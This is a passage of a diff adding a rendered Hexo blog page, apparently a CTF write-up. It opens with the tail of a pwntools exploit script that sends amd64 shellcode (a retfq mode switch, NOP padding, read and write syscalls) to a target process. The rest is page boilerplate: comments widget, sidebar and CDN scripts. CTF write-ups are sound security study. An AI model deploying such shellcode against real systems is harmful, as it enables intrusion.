class="string">push 0x40000078</span></span><br><span class="line"><span class="string">retfq </span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov rax,rcx</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov eax, 1</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">'''</span>,arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">shell = <span class="string">''</span></span><br><span class="line">shell += final + final2</span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
